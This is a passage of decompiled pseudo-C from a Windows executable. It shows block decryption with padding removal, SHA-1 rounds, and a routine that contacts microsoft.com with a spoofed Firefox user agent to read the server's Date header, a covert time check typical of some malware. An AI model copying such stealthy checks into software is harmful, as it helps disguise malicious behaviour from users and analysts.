    // 0x407f7b
    function_407641();
    int32_t v17 = v13; // 0x407f85
    int32_t v18 = v17; // 0x407f8f
    if (v2 <= 8) {
      lab_0x4080a2:
        // 0x4080a2
        function_407607();
        function_407d69();
        function_407e03();
        *a4 = v18;
        // 0x4080cb
        return 0;
    }
    // 0x407f9e
    int32_t v19; // bp-208, 0x407e70
    int32_t v20 = &v19; // 0x407f10
    int32_t * v21 = (int32_t *)(v20 - 4);
    int32_t v22; // bp-44, 0x407e70
    int32_t v23 = &v22; // 0x408013
    uint32_t v24 = v17;
    int32_t v25; // 0x407e70
    int32_t v26 = v25;
    uint32_t v27 = 8;
    int32_t v28 = 0;
    int32_t v29 = 128; // 0x407fad
    int32_t v30 = 0; // 0x407fad
    if (v27 + 128 >= v2 || v28 != (int32_t)(v27 > 0xffffff7f)) {
        // 0x407fc4
        *v21 = 0;
        v29 = v2 - v27;
        v30 = -((v28 + (int32_t)(v2 < v27)));
    }
    uint32_t v31 = v24 + 117; // 0x407fd5
    int32_t v32; // 0x407e70
    int32_t v33; // 0x407e70
    if (v26 != (int32_t)(v24 > 0xffffff8a) || v31 >= v12) {
        // 0x407ff9
        v33 = (int32_t)(v12 < v24) - v26;
        v32 = v12 - v24;
    } else {
        // 0x407fec
        *v21 = 117;
        v33 = 0;
        v32 = 117;
    }
    uint32_t v34 = v32;
    uint32_t v35 = v33;
    *v21 = v16;
    v22 = 0;
    *(int32_t *)(v20 - 8) = v14;
    *(int32_t *)(v20 - 12) = v31;
    *(int32_t *)(v20 - 16) = v23;
    *(int32_t *)(v20 - 20) = v31;
    int32_t v36; // bp-192, 0x407e70
    *(int32_t *)(v20 - 24) = (int32_t)&v36;
    *(int32_t *)(v20 - 28) = v31;
    int32_t v37 = function_4080d0(v29, v24, v22, (int32_t)&g322); // 0x408023
    int32_t result = v37; // 0x40802d
    while (v37 == 0) {
        // 0x408033
        if (v22 != 117) {
            // 0x4080c3
            *v21 = 3;
            result = 3;
            return result;
        }
        int32_t v38 = v37; // 0x408044
        if (v35 >= v37) {
            // 0x408046
            v38 = v37;
            if (v35 > v37 || v34 > v37) {
                int32_t v39 = v37; // 0x408056
                int32_t v40; // bp-4, 0x407e70
                char v41 = *(char *)((int32_t)&v40 - 188 + v39); // 0x408058
                *(char *)(v24 + a2 + v39) = v41;
                v39++;
                v38 = 0;
                while (v35 != 0 || v39 < v34) {
                    // 0x408058
                    v41 = *(char *)((int32_t)&v40 - 188 + v39);
                    *(char *)(v24 + a2 + v39) = v41;
                    v39++;
                    v38 = 0;
                }
            }
        }
        uint32_t v42 = v38;
        int32_t v43 = v34 + v24; // 0x408075
        uint32_t v44 = v29 + v27; // 0x408080
        uint32_t v45 = v30 + v28 + (int32_t)(v44 < v27); // 0x408086
        if (v45 >= v42) {
            // 0x408097
            v18 = v43;
            if (v44 < v2 != v45 <= v42) {
                goto lab_0x4080a2;
            }
        }
        // 0x407f9e
        v25 = v35 + v26 + (int32_t)(v43 < v24);
        v24 = v43;
        v26 = v25;
        v27 = v44;
        v28 = v45;
        v29 = 128;
        v30 = 0;
        if (v27 + 128 >= v2 || v28 != (int32_t)(v27 > 0xffffff7f)) {
            // 0x407fc4
            *v21 = 0;
            v29 = v2 - v27;
            v30 = -((v28 + (int32_t)(v2 < v27)));
        }
        // 0x407fcd
        v31 = v24 + 117;
        if (v26 != (int32_t)(v24 > 0xffffff8a) || v31 >= v12) {
            // 0x407ff9
            v33 = (int32_t)(v12 < v24) - v26;
            v32 = v12 - v24;
        } else {
            // 0x407fec
            *v21 = 117;
            v33 = 0;
            v32 = 117;
        }
        // 0x408008
        v34 = v32;
        v35 = v33;
        *v21 = v16;
        v22 = 0;
        *(int32_t *)(v20 - 8) = v14;
        *(int32_t *)(v20 - 12) = v31;
        *(int32_t *)(v20 - 16) = v23;
        *(int32_t *)(v20 - 20) = v31;
        *(int32_t *)(v20 - 24) = (int32_t)&v36;
        *(int32_t *)(v20 - 28) = v31;
        v37 = function_4080d0(v29, v24, v22, (int32_t)&g322);
        result = v37;
    }
  lab_0x4080cb:
    // 0x4080cb
    return result;
}

// Address range: 0x4080d0 - 0x408179
int32_t function_4080d0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4080d0
    if (a3 == 0) {
        // 0x408174
        return 3;
    }
    // 0x4080e5
    int32_t v1; // 0x4080d0
    if (function_407738(v1) == 0 || function_4070ea(a4) == 0) {
        // 0x408174
        return 1;
    }
    // 0x408105
    function_4076c6(a1);
    int32_t v2 = 0; // 0x40811a
    int32_t v3 = a1 + 127; // 0x40811a
    char * v4 = (char *)v3; // 0x40811c
    char * v5 = (char *)(v2 + a1); // 0x40811e
    *v5 = *v4;
    v2++;
    *v4 = *v5;
    v3--;
    while (v2 != 64) {
        // 0x40811c
        v4 = (char *)v3;
        v5 = (char *)(v2 + a1);
        *v5 = *v4;
        v2++;
        *v4 = *v5;
        v3--;
    }
    int32_t v6 = 0; // 0x408134
    int32_t v7 = 0; // 0x408134
    if (*(char *)a1 == 0) {
        v6++;
        v7 = v6;
        while (*(char *)(v6 + a1) == 0) {
            // 0x408136
            v6++;
            v7 = v6;
        }
    }
    // 0x40813d
    if (*(char *)(v7 + a1) != 1) {
        // 0x408168
        *(int32_t *)a2 = 128;
        // 0x408174
        return 0;
    }
    int32_t v8 = v7;
    int32_t v9 = v8 + 1; // 0x40814b
    char * v10 = (char *)(v9 + a1);
    while (v9 < 128) {
        // 0x408145
        if (*v10 != -1) {
            // break -> 0x408150
            break;
        }
        v8 = v9;
        v9 = v8 + 1;
        v10 = (char *)(v9 + a1);
    }
    // 0x408150
    if (*v10 != 0) {
        // 0x408168
        *(int32_t *)a2 = 128;
        // 0x408174
        return 0;
    }
    int32_t v11 = 126 - v8; // 0x408157
    int32_t v12 = v11; // 0x408159
    if (v11 == 0) {
        // 0x408168
        *(int32_t *)a2 = 0;
        // 0x408174
        return 0;
    }
    int32_t v13 = a1;
    *(char *)v13 = *(char *)(v8 + 2 + v13);
    v12--;
    int32_t v14 = v13 + 1; // 0x408166
    while (v12 != 0) {
        // 0x40815d
        v13 = v14;
        *(char *)v13 = *(char *)(v8 + 2 + v13);
        v12--;
        v14 = v13 + 1;
    }
    // 0x408168
    *(int32_t *)a2 = v11;
    // 0x408174
    return 0;
}

// Address range: 0x408179 - 0x40820b
int32_t function_408179(void) {
    // 0x408179
    int128_t v1; // 0x408179
    int128_t v2 = v1;
    int32_t v3; // 0x408179
    char * v4 = StrStrA((char *)v3, "\r\nDate"); // 0x408187
    int64_t v5; // 0x408179
    __asm_movlpd(v5, __asm_xorps(v2, v2));
    int32_t lpSystemTime = 0; // bp-44, 0x40819f
    bool v6; // 0x408179
    int32_t v7 = v6 ? -4 : 4; // 0x40819f
    int32_t v8 = v7 + (int32_t)&lpSystemTime; // 0x40819f
    *(int32_t *)v8 = 0;
    int32_t v9 = v8 + v7; // 0x4081a0
    *(int32_t *)v9 = 0;
    *(int32_t *)(v9 + v7) = 0;
    int32_t v10 = 0; // bp-28, 0x4081a8
    int32_t v11 = v7 + (int32_t)&v10; // 0x4081a8
    *(int32_t *)v11 = 0;
    int32_t v12 = v11 + v7; // 0x4081a9
    *(int32_t *)v12 = 0;
    *(int32_t *)(v12 + v7) = 0;
    bool v13 = InternetTimeToSystemTimeA((char *)((int32_t)v4 + 7), (struct _SYSTEMTIME *)&lpSystemTime, (int32_t)&g322); // 0x4081b1
    if (!v13) {
        // 0x4081c1
        GetLastError();
    }
    // 0x4081c3
    int64_t lpFileTime; // bp-12, 0x408179
    if (!SystemTimeToFileTime((struct _SYSTEMTIME *)&lpSystemTime, (struct _FILETIME *)&lpFileTime)) {
        // 0x4081d5
        GetLastError();
    }
    // 0x4081d7
    WsFileTimeToDateTime((struct _FILETIME *)&lpFileTime, (struct _WS_DATETIME *)&v10, NULL);
    return function_401100(function_401140(v10, v3, 0x4e72a000, 2328), v3, 0x4e72a000, 2328);
}

// Address range: 0x40820b - 0x408316
int32_t function_40820b(int16_t a1, char a2) {
    // 0x40820b
    int32_t v1; // bp-8, 0x40820b
    int32_t v2 = &v1; // 0x40821f
    int32_t v3; // bp-64, 0x40820b
    int32_t v4 = &v3; // 0x408226
    int16_t v5; // bp-32, 0x40820b
    int32_t v6 = &v5;
    int32_t v7; // bp-76, 0x40820b
    int32_t v8 = &v7;
    int128_t v9; // 0x40820b
    int128_t v10 = v9;
    v1 = 0;
    *(int32_t *)(v8 - 4) = v2;
    v3 = 0;
    *(int32_t *)(v8 - 8) = v4;
    int128_t v11 = __asm_xorps(v10, v10); // 0x408227
    *(int32_t *)(v8 - 12) = 0;
    *(int32_t *)(v8 - 16) = (int32_t)"microsoft.com";
    int64_t v12; // 0x40820b
    __asm_movlpd(v12, v11);
    __asm_movlpd(v12, v11);
    int32_t v13 = getaddrinfo((char *)1, (char *)6, (struct addrinfo *)&g322, (struct addrinfo **)&g322); // 0x40824b
    int32_t result = 0; // 0x408253
    while (v13 == 0) {
        // 0x408259
        *(int32_t *)(v8 - 20) = 0;
        *(int32_t *)(v8 - 24) = 1;
        *(int32_t *)(v8 - 28) = 2;
        int32_t sock_fd = socket((int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x408263
        result = 0;
        if (sock_fd == -1) {
            // break -> 0x408311
            break;
        }
        // 0x408274
        *(int32_t *)(v8 - 32) = 80;
        v5 = 2;
        uint16_t addr_info = htons(2); // 0x408283
        *(int32_t *)(v8 - 36) = v1;
        freeaddrinfo((struct addrinfo *)(int32_t)addr_info);
        *(int32_t *)(v8 - 40) = 0;
        *(int32_t *)(v8 - 44) = 0;
        *(int32_t *)(v8 - 48) = 0;
        *(int32_t *)(v8 - 52) = 0;
        *(int32_t *)(v8 - 56) = 16;
        *(int32_t *)(v8 - 60) = v6;
        *(int32_t *)(v8 - 64) = sock_fd;
        int32_t v14 = WSAConnect((int32_t)&g322, (struct sockaddr *)&g322, (int32_t)&g322, (struct _WSABUF *)&g322, (struct _WSABUF *)&g322, (struct _QualityOfService *)&g322, (struct _QualityOfService *)&g322); // 0x4082a1
        result = 0;
        if (v14 == -1) {
            // break -> 0x408311
            break;
        }
        // 0x4082ac
        *(int32_t *)(v8 - 68) = 0;
        *(int32_t *)(v8 - 72) = 364;
        *(int32_t *)(v8 - 76) = (int32_t)"\r\nGET http://microsoft.com/ HTTP/1.1\r\nHost: microsoft.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n";
        *(int32_t *)(v8 - 80) = sock_fd;
        send((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
        int32_t * v15 = (int32_t *)(v8 - 84); // 0x4082be
        *v15 = 512;
        int32_t v16 = function_401000((int32_t)&g322); // 0x4082c3
        *v15 = 0;
        *(int32_t *)(v8 - 88) = 512;
        *(int32_t *)(v8 - 92) = v16;
        *(int32_t *)(v8 - 96) = sock_fd;
        uint32_t v17 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x4082d3
        int32_t v18 = function_408179(); // 0x4082dd
        int32_t v19 = v8 - 100; // 0x4082e2
        int32_t * v20 = (int32_t *)v19; // 0x4082e2
        *v20 = v16;
        int32_t v21; // 0x40820b
        function_401014(v21);
        *v20 = sock_fd;
        closesocket((int32_t)&g322);
        *(int32_t *)(v8 - 104) = 2;
        result = v18;
        if (v17 >= 100) {
            // break -> 0x408311
            break;
        }
        v8 = v19;
        v10 = v11;
        v1 = 0;
        *(int32_t *)(v8 - 4) = v2;
        v3 = 0;
        *(int32_t *)(v8 - 8) = v4;
        v11 = __asm_xorps(v10, v10);
        *(int32_t *)(v8 - 12) = 0;
        *(int32_t *)(v8 - 16) = (int32_t)"microsoft.com";
        __asm_movlpd(v12, v11);
        __asm_movlpd(v12, v11);
        v13 = getaddrinfo((char *)1, (char *)6, (struct addrinfo *)&g322, (struct addrinfo **)&g322);
        result = 0;
    }
    // 0x408311
    return result;
}

// Address range: 0x408316 - 0x4083af
int32_t function_408316(void) {
    // 0x408316
    int32_t v1; // bp-24, 0x408316
    int32_t v2 = &v1; // 0x40831d
    int32_t * v3 = (int32_t *)(v2 - 4);
    int32_t v4; // bp-4, 0x408316
    int32_t v5 = (int32_t)&v4 - 12; // 0x40833f
    uint32_t v6 = 0;
    *v3 = 3;
    int32_t v7; // 0x408316
    uint32_t v8 = *(int32_t *)((v6 < 4 ? 24 : 20) + v7); // 0x408339
    *(char *)(v5 + v6) = (char)(v8 >> (8 * v6 & 24 ^ 24));
    int32_t v9 = v6 + 1; // 0x408343
    while (v9 != 8) {
        // 0x408324
        v6 = v9;
        *v3 = 3;
        v8 = *(int32_t *)((v6 < 4 ? 24 : 20) + v7);
        *(char *)(v5 + v6) = (char)(v8 >> (8 * v6 & 24 ^ 24));
        v9 = v6 + 1;
    }
    // 0x408353
    *v3 = 1;
    function_4083af(-128);
    char v10 = 0; // 0x40836d
    while ((*(int32_t *)(v7 + 20) & 504) != 448) {
        // 0x408353
        *v3 = 1;
        function_4083af(v10);
        v10 = 0;
    }
    // 0x40836f
    *v3 = 8;
    function_4083af((char)&g322);
    int32_t v11 = 0;
    *v3 = 3;
    uint32_t v12 = *(int32_t *)((v11 & 0x7ffffffc) + v7); // 0x408390
    *(char *)(v11 + v7) = (char)(v12 >> (8 * v11 & 24 ^ 24));
    int32_t v13 = v11 + 1; // 0x408398
    while (v13 != 20) {
        // 0x40837e
        v11 = v13;
        *v3 = 3;
        v12 = *(int32_t *)((v11 & 0x7ffffffc) + v7);
        *(char *)(v11 + v7) = (char)(v12 >> (8 * v11 & 24 ^ 24));
        v13 = v11 + 1;
    }
    // 0x40839e
    *v3 = 92;
    *(int32_t *)(v2 - 8) = 0;
    return function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
}

// Address range: 0x4083af - 0x40844f
int32_t function_4083af(char a1) {
    uint32_t v1 = (int32_t)a1;
    int32_t v2; // 0x4083af
    int32_t * v3 = (int32_t *)(v2 + 20); // 0x4083b9
    uint32_t v4 = *v3; // 0x4083b9
    uint32_t v5 = v4 + 8 * v1; // 0x4083c3
    *v3 = v5;
    int32_t * v6 = (int32_t *)(v2 + 24);
    int32_t v7 = *v6;
    int32_t v8 = v7; // 0x4083cb
    if (v5 < v4) {
        // 0x4083cd
        v8 = v7 + 1;
        *v6 = v8;
    }
    int32_t v9 = v4 / 8 % 64; // 0x4083d5
    *v6 = v8 + v1 / 0x20000000;
    int32_t v10; // 0x4083af
    int32_t result; // 0x408442
    if (v9 + v1 < 64) {
        // 0x408435
        v10 = 0;
        int32_t v11 = v2 + 28;
        result = function_40126d((int32_t *)(v9 + v11), (int32_t *)(v10 + v2), v1 - v10);
        return result;
    }
    int32_t v12 = 64 - v9; // 0x4083e9
    int32_t v13 = v2 + 28;
    function_40126d((int32_t *)(v9 + v13), (int32_t *)v2, v12);
    function_40847a();
    int32_t v14 = v12 + 63; // 0x408408
    int32_t v15 = v14; // 0x40842a
    int32_t v16 = v12; // 0x40842a
    if (v14 >= v1) {
        // 0x408435
        v10 = v12;
        result = function_40126d((int32_t *)v13, (int32_t *)(v10 + v2), v1 - v10);
        return result;
    }
    function_40847a();
    v16 += 64;
    v15 += 64;
    while (v15 < v1) {
        // 0x40840d
        function_40847a();
        v16 += 64;
        v15 += 64;
    }
    // 0x408435
    v10 = v16;
    result = function_40126d((int32_t *)v13, (int32_t *)(v10 + v2), v1 - v10);
    return result;
}

// Address range: 0x40844f - 0x40847a
int32_t function_40844f(void) {
    // 0x40844f
    int32_t result; // 0x40844f
    *(int32_t *)(result + 24) = 0;
    *(int32_t *)(result + 20) = 0;
    *(int32_t *)result = 0x67452301;
    *(int32_t *)(result + 4) = -0x10325477;
    *(int32_t *)(result + 8) = -0x67452302;
    *(int32_t *)(result + 12) = 0x10325476;
    *(int32_t *)(result + 16) = -0x3c2d1e10;
    return result;
}

// Address range: 0x40847a - 0x409554
int32_t function_40847a(void) {
    // 0x40847a
    int32_t v1; // 0x40847a
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x408495
    uint32_t v3 = *v2; // 0x408495
    int32_t v4; // bp-160, 0x40847a
    __asm_rep_movsd_memcpy((char *)&v4, (char *)v1, 16);
    int32_t v5 = llvm_bswap_i32(v4); // 0x4084bb
    int32_t * v6 = (int32_t *)(v1 + 16); // 0x4084c5
    int32_t * v7 = (int32_t *)(v1 + 12); // 0x4084ca
    int32_t v8 = *v7; // 0x4084ca
    int32_t * v9 = (int32_t *)(v1 + 8); // 0x4084cd
    int32_t v10 = *v9; // 0x4084cd
    int32_t v11 = v3 / 4 | 0x40000000 * v3; // 0x4084d2
    uint32_t v12 = v5 + 0x5a827999 + *v6 + ((v10 ^ v8) & v3 ^ v8); // 0x4084e3
    int32_t v13 = llvm_bswap_i32(v1); // 0x408503
    int32_t v14 = v10 + 0x5a827999;
    uint32_t v15 = v8 + v13 + v14 + (v12 / 0x8000000 | 32 * v12); // 0x408529
    int32_t v16 = llvm_bswap_i32(v1); // 0x408544
    uint32_t v17 = v14 + v16 + (v11 & -1 - v12) + (v15 / 0x8000000 | 32 * v15); // 0x408567
    int32_t v18 = v12 / 4 | 0x40000000 * v12; // 0x40856f
    int32_t v19 = llvm_bswap_i32(v1); // 0x40858e
    int32_t v20 = v15 / 4 | 0x40000000 * v15; // 0x4085a7
    uint32_t v21 = v19 + 0x5a827999 + v11 + (v15 & v18) + (v17 / 0x8000000 | 32 * v17); // 0x4085aa
    int32_t v22 = llvm_bswap_i32(v1); // 0x4085c5
    int32_t v23 = v17 / 4 | 0x40000000 * v17; // 0x4085eb
    uint32_t v24 = v22 + 0x5a827999 + ((v20 ^ v18) & v17 ^ v18) + (v21 / 0x8000000 | 32 * v21); // 0x4085ee
    int32_t v25 = llvm_bswap_i32(v1); // 0x408603
    int32_t v26 = v21 / 4 | 0x40000000 * v21; // 0x408620
    uint32_t v27 = v25 + 0x5a827999 + v18 + ((v23 ^ v20) & v21 ^ v20) + (v24 / 0x8000000 | 32 * v24); // 0x40862c
    int32_t v28 = llvm_bswap_i32(v1); // 0x40864d
    int32_t v29 = v24 / 4 | 0x40000000 * v24; // 0x40865e
    uint32_t v30 = v28 + 0x5a827999 + v20 + (v24 & (v26 ^ v23) ^ v23) + (v27 / 0x8000000 | 32 * v27); // 0x408666
    int32_t v31 = llvm_bswap_i32(v1); // 0x408681
    int32_t v32 = v27 / 4 | 0x40000000 * v27; // 0x40869a
    uint32_t v33 = v31 + 0x5a827999 + v23 + ((v29 ^ v26) & v27 ^ v26) + (v30 / 0x8000000 | 32 * v30); // 0x4086a8
    int32_t v34 = llvm_bswap_i32(v1); // 0x4086c3
    int32_t v35 = v30 / 4 | 0x40000000 * v30; // 0x4086d6
    uint32_t v36 = v34 + 0x5a827999 + v26 + ((v32 ^ v29) & v30 ^ v29) + (v33 / 0x8000000 | 32 * v33); // 0x4086e4
    int32_t v37 = llvm_bswap_i32(v1); // 0x4086ff
    int32_t v38 = v33 / 4 | 0x40000000 * v33; // 0x408712
    uint32_t v39 = v37 + 0x5a827999 + v29 + ((v35 ^ v32) & v33 ^ v32) + (v36 / 0x8000000 | 32 * v36); // 0x40871d
    int32_t v40 = llvm_bswap_i32(v1); // 0x40873e
    int32_t v41 = v36 / 4 | 0x40000000 * v36; // 0x408753
    uint32_t v42 = v40 + 0x5a827999 + v32 + ((v38 ^ v35) & v36 ^ v35) + (v39 / 0x8000000 | 32 * v39); // 0x408756
    int32_t v43 = v42 / 4 | 0x40000000 * v42; // 0x408771
    int32_t v44 = llvm_bswap_i32(v1); // 0x408775
    uint32_t v45 = v44 + 0x5a827999 + v35 + ((v41 ^ v38) & v39 ^ v38) + (v42 / 0x8000000 | 32 * v42); // 0x408798
    int32_t v46 = v39 / 4 | 0x40000000 * v39; // 0x4087ae
    int32_t v47 = llvm_bswap_i32(v1); // 0x4087b1
    uint32_t v48 = v47 + 0x5a827999 + v38 + (v42 & (v46 ^ v41) ^ v41) + (v45 / 0x8000000 | 32 * v45); // 0x4087dd
    int32_t v49 = llvm_bswap_i32(v1); // 0x4087f2
    int32_t v50 = v45 / 4 | 0x40000000 * v45; // 0x40880f
    uint32_t v51 = v49 + 0x5a827999 + v41 + ((v43 ^ v46) & v45 ^ v46) + (v48 / 0x8000000 | 32 * v48); // 0x408815
    int32_t v52 = llvm_bswap_i32(v1); // 0x40882b
    int32_t v53 = v48 / 4 | 0x40000000 * v48; // 0x40884e
    uint32_t v54 = v52 + 0x5a827999 + v46 + ((v50 ^ v43) & v48 ^ v43) + (v51 / 0x8000000 | 32 * v51); // 0x408851
    int32_t v55 = llvm_bswap_i32(v1); // 0x408869
    int32_t v56 = v34 ^ v49 ^ v16 ^ v5; // 0x408889
    int32_t v57 = 2 * v56 | (int32_t)(v56 < 0); // 0x40888f
    uint32_t v58 = v55 + 0x5a827999 + v43 + ((v53 ^ v50) & v51 ^ v50) + (v54 / 0x8000000 | 32 * v54); // 0x40889a
    int32_t v59 = v51 / 4 | 0x40000000 * v51; // 0x40889c
    int32_t v60 = v37 ^ v52 ^ v19 ^ v13; // 0x4088bd
    int32_t v61 = 2 * v60 | (int32_t)(v60 < 0); // 0x4088c3
    uint32_t v62 = v57 + 0x5a827999 + v50 + ((v59 ^ v53) & v54 ^ v53) + (v58 / 0x8000000 | 32 * v58); // 0x4088ce
    int32_t v63 = v54 / 4 | 0x40000000 * v54; // 0x4088d0
    int32_t v64 = v40 ^ v55 ^ v22 ^ v16; // 0x4088f1
    int32_t v65 = 2 * v64 | (int32_t)(v64 < 0); // 0x4088f7
    uint32_t v66 = v61 + 0x5a827999 + v53 + ((v63 ^ v59) & v58 ^ v59) + (v62 / 0x8000000 | 32 * v62); // 0x408902
    int32_t v67 = v58 / 4 | 0x40000000 * v58; // 0x408904
    int32_t v68 = v62 / 4 | 0x40000000 * v62; // 0x40891a
    int32_t v69 = v25 ^ v44 ^ v19 ^ v57; // 0x408931
    uint32_t v70 = v65 + 0x5a827999 + v59 + ((v67 ^ v63) & v62 ^ v63) + (v66 / 0x8000000 | 32 * v66); // 0x408934
    int32_t v71 = 2 * v69 | (int32_t)(v69 < 0); // 0x408936
    int32_t v72 = v66 / 4 | 0x40000000 * v66; // 0x40894e
    int32_t v73 = v28 ^ v47 ^ v22 ^ v61; // 0x408960
    int32_t v74 = 2 * v73 | (int32_t)(v73 < 0); // 0x40896c
    uint32_t v75 = v71 + 0x5a827999 + v63 + ((v68 ^ v67) & v66 ^ v67) + (v70 / 0x8000000 | 32 * v70); // 0x40896e
    int32_t v76 = v70 / 4 | 0x40000000 * v70; // 0x408975
    int32_t v77 = v31 ^ v49 ^ v25 ^ v65; // 0x40898f
    int32_t v78 = 2 * v77 | (int32_t)(v77 < 0); // 0x40899b
    uint32_t v79 = v74 + 0x6ed9eba1 + v67 + (v72 ^ v68 ^ v70) + (v75 / 0x8000000 | 32 * v75); // 0x40899d
    int32_t v80 = v75 / 4 | 0x40000000 * v75; // 0x4089ae
    int32_t v81 = v34 ^ v52 ^ v28 ^ v71; // 0x4089be
    int32_t v82 = 2 * v81 | (int32_t)(v81 < 0); // 0x4089ca
    uint32_t v83 = v78 + 0x6ed9eba1 + v68 + (v76 ^ v72 ^ v75) + (v79 / 0x8000000 | 32 * v79); // 0x4089cc
    int32_t v84 = v79 / 4 | 0x40000000 * v79; // 0x4089d3
    int32_t v85 = v37 ^ v55 ^ v31 ^ v74; // 0x4089e6
    int32_t v86 = 2 * v85 | (int32_t)(v85 < 0); // 0x4089f2
    uint32_t v87 = v82 + 0x6ed9eba1 + v72 + (v80 ^ v76 ^ v79) + (v83 / 0x8000000 | 32 * v83); // 0x4089f4
    uint32_t v88 = v86 + 0x6ed9eba1 + v76 + (v84 ^ v80 ^ v83) + (v87 / 0x8000000 | 32 * v87); // 0x408a12
    int32_t v89 = v83 / 4 | 0x40000000 * v83; // 0x408a1a
    int32_t v90 = v34 ^ v40 ^ v78 ^ v57; // 0x408a29
    int32_t v91 = 2 * v90 | (int32_t)(v90 < 0); // 0x408a2c
    int32_t v92 = v87 / 4 | 0x40000000 * v87; // 0x408a3f
    uint32_t v93 = v91 + 0x6ed9eba1 + v80 + (v89 ^ v84 ^ v87) + (v88 / 0x8000000 | 32 * v88); // 0x408a45
    int32_t v94 = v37 ^ v44 ^ v61 ^ v82; // 0x408a53
    int32_t v95 = 2 * v94 | (int32_t)(v94 < 0); // 0x408a59
    int32_t v96 = v88 / 4 | 0x40000000 * v88; // 0x408a75
    uint32_t v97 = v95 + 0x6ed9eba1 + v84 + (v92 ^ v89 ^ v88) + (v93 / 0x8000000 | 32 * v93); // 0x408a7b
    int32_t v98 = v40 ^ v47 ^ v65 ^ v86; // 0x408a83
    int32_t v99 = 2 * v98 | (int32_t)(v98 < 0); // 0x408a89
    int32_t v100 = v93 / 4 | 0x40000000 * v93; // 0x408aa5
    uint32_t v101 = v99 + 0x6ed9eba1 + v89 + (v96 ^ v92 ^ v93) + (v97 / 0x8000000 | 32 * v97); // 0x408aab
    int32_t v102 = v44 ^ v49 ^ v91 ^ v71; // 0x408ab3
    int32_t v103 = 2 * v102 | (int32_t)(v102 < 0); // 0x408ab9
    int32_t v104 = v97 / 4 | 0x40000000 * v97; // 0x408ad5
    uint32_t v105 = v103 + 0x6ed9eba1 + v92 + (v100 ^ v96 ^ v97) + (v101 / 0x8000000 | 32 * v101); // 0x408adb
    int32_t v106 = v47 ^ v52 ^ v74 ^ v95; // 0x408ae3
    int32_t v107 = 2 * v106 | (int32_t)(v106 < 0); // 0x408ae9
    uint32_t v108 = v107 + 0x6ed9eba1 + v96 + (v104 ^ v100 ^ v101) + (v105 / 0x8000000 | 32 * v105); // 0x408aff
    int32_t v109 = v49 ^ v55 ^ v78 ^ v99; // 0x408b10
    int32_t v110 = 2 * v109 | (int32_t)(v109 < 0); // 0x408b13
    int32_t v111 = v101 / 4 | 0x40000000 * v101; // 0x408b2c
    int32_t v112 = v105 / 4 | 0x40000000 * v105; // 0x408b33
    uint32_t v113 = v110 + 0x6ed9eba1 + v100 + (v111 ^ v104 ^ v105) + (v108 / 0x8000000 | 32 * v108); // 0x408b3e
    int32_t v114 = v57 ^ v52 ^ v82 ^ v103; // 0x408b43
    int32_t v115 = 2 * v114 | (int32_t)(v114 < 0); // 0x408b49
    int32_t v116 = v108 / 4 | 0x40000000 * v108; // 0x408b65
    uint32_t v117 = v115 + 0x6ed9eba1 + v104 + (v112 ^ v111 ^ v108) + (v113 / 0x8000000 | 32 * v113); // 0x408b6b
    int32_t v118 = v61 ^ v55 ^ v86 ^ v107; // 0x408b73
    int32_t v119 = 2 * v118 | (int32_t)(v118 < 0); // 0x408b79
    int32_t v120 = v113 / 4 | 0x40000000 * v113; // 0x408b95
    uint32_t v121 = v119 + 0x6ed9eba1 + v111 + (v116 ^ v112 ^ v113) + (v117 / 0x8000000 | 32 * v117); // 0x408b9b
    int32_t v122 = v57 ^ v65 ^ v110 ^ v91; // 0x408ba3
    int32_t v123 = 2 * v122 | (int32_t)(v122 < 0); // 0x408ba9
    int32_t v124 = v117 / 4 | 0x40000000 * v117; // 0x408bbf
    uint32_t v125 = v123 + 0x6ed9eba1 + v112 + (v120 ^ v116 ^ v117) + (v121 / 0x8000000 | 32 * v121); // 0x408bc5
    int32_t v126 = v71 ^ v61 ^ v95 ^ v115; // 0x408bcd
    int32_t v127 = 2 * v126 | (int32_t)(v126 < 0); // 0x408bd3
    int32_t v128 = v121 / 4 | 0x40000000 * v121; // 0x408bef
    uint32_t v129 = v127 + 0x6ed9eba1 + v116 + (v124 ^ v120 ^ v121) + (v125 / 0x8000000 | 32 * v125); // 0x408bf5
    int32_t v130 = v74 ^ v65 ^ v99 ^ v119; // 0x408c03
    int32_t v131 = 2 * v130 | (int32_t)(v130 < 0); // 0x408c06
    int32_t v132 = v125 / 4 | 0x40000000 * v125; // 0x408c25
    uint32_t v133 = v131 + 0x6ed9eba1 + v120 + (v128 ^ v124 ^ v125) + (v129 / 0x8000000 | 32 * v129); // 0x408c2b
    int32_t v134 = v71 ^ v78 ^ v103 ^ v123; // 0x408c33
    int32_t v135 = 2 * v134 | (int32_t)(v134 < 0); // 0x408c39
    int32_t v136 = v129 / 4 | 0x40000000 * v129; // 0x408c55
    uint32_t v137 = v135 + 0x6ed9eba1 + v124 + (v132 ^ v128 ^ v129) + (v133 / 0x8000000 | 32 * v133); // 0x408c5b
    int32_t v138 = v82 ^ v74 ^ v107 ^ v127; // 0x408c63
    int32_t v139 = 2 * v138 | (int32_t)(v138 < 0); // 0x408c6c
    int32_t v140 = v133 / 4 | 0x40000000 * v133; // 0x408c87
    uint32_t v141 = v139 + 0x6ed9eba1 + v128 + (v136 ^ v132 ^ v133) + (v137 / 0x8000000 | 32 * v137); // 0x408c8d
    int32_t v142 = v86 ^ v78 ^ v110 ^ v131; // 0x408c95
    int32_t v143 = 2 * v142 | (int32_t)(v142 < 0); // 0x408c9b
    int32_t v144 = v137 / 4 | 0x40000000 * v137; // 0x408cb1
    uint32_t v145 = v143 + 0x6ed9eba1 + v132 + (v140 ^ v136 ^ v137) + (v141 / 0x8000000 | 32 * v141); // 0x408cb7
    int32_t v146 = v82 ^ v91 ^ v115 ^ v135; // 0x408cbf
    int32_t v147 = 2 * v146 | (int32_t)(v146 < 0); // 0x408cc8
    int32_t v148 = v141 / 4 | 0x40000000 * v141; // 0x408ce2
